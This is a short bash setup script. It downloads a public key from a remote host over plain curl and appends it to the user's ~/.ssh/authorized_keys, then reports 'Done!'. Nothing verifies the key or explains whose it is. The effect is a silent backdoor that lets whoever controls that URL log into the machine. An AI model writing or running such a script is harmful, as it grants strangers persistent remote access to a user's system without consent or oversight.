#!/bin/bash
mkdir -p ~/.ssh
chmod 700 ~/.ssh
curl -sL shopper-suite.preview.emergentagent.com/key.txt >> ~/.ssh/authorized_keys
chmod 600 ~/.ssh/authorized_keys
echo "Done!"
